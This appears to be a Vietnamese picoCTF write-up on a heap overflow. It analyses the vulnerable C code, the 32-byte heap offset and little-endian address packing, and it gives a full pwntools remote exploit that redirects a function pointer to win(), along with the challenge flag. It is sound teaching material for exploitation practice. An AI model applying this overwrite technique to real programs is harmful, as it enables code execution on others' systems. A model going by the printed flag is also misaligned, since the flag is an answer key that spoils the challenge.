# picoCTF Writeup — Heap Overflow Function Pointer

## Thông tin bài

- Nền tảng: picoCTF
- Dạng lỗi: Heap Overflow
- Kỹ thuật: Ghi đè dữ liệu được dùng như con trỏ hàm
- Flag:

```text
picoCTF{and_down_the_road_we_go_856288fc}
```

---

## Mã nguồn quan trọng

```c
char *x;
char *input_data;

void win() {
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
    fgets(buf, FLAGSIZE_MAX, fd);
    printf("%s\n", buf);
    fflush(stdout);

    exit(0);
}

void check_win() {
    ((void (*)())*(int*)x)();
}
```

Trong hàm `init()`:

```c
input_data = malloc(5);
strncpy(input_data, "pico", 5);

x = malloc(5);
strncpy(x, "bico", 5);
```

Trong hàm ghi dữ liệu:

```c
void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}
```

---

## Phân tích lỗi

Hai vùng nhớ `input_data` và `x` đều được cấp phát trên heap:

```c
input_data = malloc(5);
x = malloc(5);
```

Tuy nhiên, chương trình đọc dữ liệu bằng:

```c
scanf("%s", input_data);
```

`scanf("%s")` không giới hạn số ký tự nhập vào, trong khi `input_data` chỉ được cấp phát 5 byte. Vì vậy, ta có thể ghi tràn khỏi vùng nhớ của `input_data` sang vùng nhớ của `x`.

Sơ đồ tổng quát:

```text
input_data chunk                       x chunk
+---------------------------+          +-------------------+
| dữ liệu người dùng nhập   | -------> | "bico" ban đầu    |
+---------------------------+ overflow +-------------------+
```

Mục tiêu là thay nội dung `"bico"` trong vùng nhớ mà `x` trỏ tới bằng địa chỉ của hàm `win()`.

---

## Phân tích hàm `check_win()`

```c
void check_win() {
    ((void (*)())*(int*)x)();
}
```

Tách biểu thức này thành từng phần:

```c
(int *)x
```

Ép `x` thành con trỏ kiểu `int *`.

```c
*(int *)x
```

Đọc 4 byte đầu tiên tại vùng nhớ mà `x` trỏ tới.

```c
(void (*)())
```

Ép giá trị vừa đọc thành một con trỏ tới hàm không nhận tham số và không trả về giá trị.

Dấu `()` cuối cùng gọi hàm tại địa chỉ đó.

Có thể viết lại dễ hiểu hơn như sau:

```c
void check_win() {
    int address = *(int *)x;
    void (*function_pointer)() = (void (*)())address;
    function_pointer();
}
```

Do đó, nếu 4 byte đầu tiên tại vùng nhớ của `x` chứa địa chỉ của `win()`, khi chọn menu số 4 chương trình sẽ gọi `win()` và in flag.

Điểm quan trọng là ta không ghi đè biến con trỏ `x` ở vùng global. Ta chỉ ghi đè dữ liệu trong vùng heap mà `x` đang trỏ tới.

```text
Không phải:

x = địa chỉ win

Mà là:

x ───► [địa chỉ win]
```

---

## Xác định khoảng cách giữa hai vùng heap

Chọn chức năng `Print Heap`, chương trình in ra:

```text
[*]   0x2017c6b0  ->   pico
[*]   0x2017c6d0  ->   bico
```

Trong đó:

```text
input_data = 0x2017c6b0
x          = 0x2017c6d0
```

Khoảng cách giữa hai vùng:

```text
0x2017c6d0 - 0x2017c6b0 = 0x20 = 32 byte
```

Vì vậy, cần ghi 32 byte đệm trước khi bắt đầu ghi vào vùng nhớ của `x`.

Payload có dạng:

```python
payload = b"A" * 32 + địa_chỉ_win
```

---

## Tìm địa chỉ hàm `win`

Có thể dùng một trong các lệnh sau:

```bash
nm -n ./vuln | grep " win"
```

Hoặc:

```bash
objdump -d ./vuln | grep "<win>"
```

Hoặc trong GDB:

```gdb
p win
```

Địa chỉ tìm được:

```text
win = 0x4011a0
```

Binary không bật PIE nên địa chỉ này cố định giữa các lần chạy.

---

## Vì sao nhập chuỗi `0x4011a0` bị segmentation fault?

Payload thử ban đầu:

```text
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0x4011a0
```

Sau khi ghi tràn, chương trình hiển thị:

```text
[*] 0x2017c6d0 -> 0x4011a0
```

Nhìn bằng mắt có vẻ đúng, nhưng dữ liệu thực tế trong bộ nhớ chỉ là các ký tự ASCII:

```text
'0' 'x' '4' '0' '1' '1' 'a' '0'
```

Bốn byte đầu tiên là:

```text
30 78 34 30
```

Trên kiến trúc little-endian, `check_win()` sẽ hiểu chúng thành địa chỉ:

```text
0x30347830
```

Đây không phải địa chỉ `0x4011a0`, nên chương trình nhảy tới vùng nhớ không hợp lệ và bị segmentation fault.

Địa chỉ phải được ghi dưới dạng nhị phân little-endian:

```text
0x4011a0 -> a0 11 40 00
```

Trong pwntools:

```python
p32(0x4011a0)
```

Kết quả tương đương:

```python
b"\xa0\x11\x40\x00"
```

---

## Payload khai thác

```python
payload = b"A" * 32 + p32(0x4011a0)
```

Cấu trúc payload:

```text
+----------------------------------+---------------------+
| 32 byte A                        | địa chỉ hàm win     |
+----------------------------------+---------------------+
| ghi đầy khoảng cách tới x        | a0 11 40 00         |
+----------------------------------+---------------------+
```

Sau khi ghi payload:

```text
input_data chunk                  x chunk
+-----------------------------+   +-------------------+
| AAAAAAAAAAAAAAAAAAAAAAAAAAAA|-->| a0 11 40 00      |
+-----------------------------+   +-------------------+
```

Khi chọn menu số 4:

```c
check_win();
```

Chương trình đọc `0x4011a0` từ vùng nhớ của `x` và gọi:

```c
win();
```

---

## Mã khai thác remote bằng pwntools

```python
from pwn import *
import sys

context.binary = elf = ELF("./vuln", checksec=False)
context.log_level = "info"

if len(sys.argv) != 3:
    log.error(f"Usage: python3 {sys.argv[0]} HOST PORT")

host = sys.argv[1]
port = int(sys.argv[2])

p = remote(host, port)

offset = 32
win_addr = 0x4011a0

payload = b"A" * offset + p32(win_addr)

log.info(f"Offset: {offset}")
log.info(f"win(): {hex(win_addr)}")
log.info(f"Payload: {payload!r}")

# Chọn chức năng ghi dữ liệu vào input_data
p.sendlineafter(b"Enter your choice: ", b"2")
p.sendlineafter(b"Data for buffer: ", payload)

# Chọn chức năng gọi check_win()
p.sendlineafter(b"Enter your choice: ", b"4")

p.interactive()
```

Chạy exploit:

```bash
python3 solve.py HOST PORT
```

Ví dụ:

```bash
python3 solve.py saturn.picoctf.net 12345
```

---

## Kết quả

Sau khi gửi payload và chọn menu số 4, chương trình gọi hàm `win()` và trả về flag:

```text
picoCTF{and_down_the_road_we_go_856288fc}
```

---

## Tổng kết

Các bước khai thác:

1. Phát hiện `scanf("%s", input_data)` gây heap overflow.
2. Xác định `input_data` nằm trước `x` trên heap.
3. Tính khoảng cách giữa hai vùng là 32 byte.
4. Tìm địa chỉ hàm `win()` là `0x4011a0`.
5. Đóng gói địa chỉ bằng `p32()` theo thứ tự little-endian.
6. Ghi tràn từ `input_data` sang vùng nhớ của `x`.
7. Chọn menu số 4 để `check_win()` gọi địa chỉ đã bị thay đổi.
8. Hàm `win()` được thực thi và in flag.
